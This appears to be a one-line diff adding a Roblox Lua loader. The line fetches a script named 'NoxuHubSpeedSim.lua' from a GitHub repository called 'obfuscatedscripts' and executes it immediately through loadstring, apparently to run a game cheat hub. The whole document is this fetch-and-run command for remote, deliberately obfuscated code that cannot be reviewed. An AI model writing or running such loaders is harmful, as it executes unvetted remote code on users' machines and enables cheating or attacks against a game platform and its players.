@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NoxuHub/obfuscatedscripts/main/NoxuHubSpeedSim.lua"))()
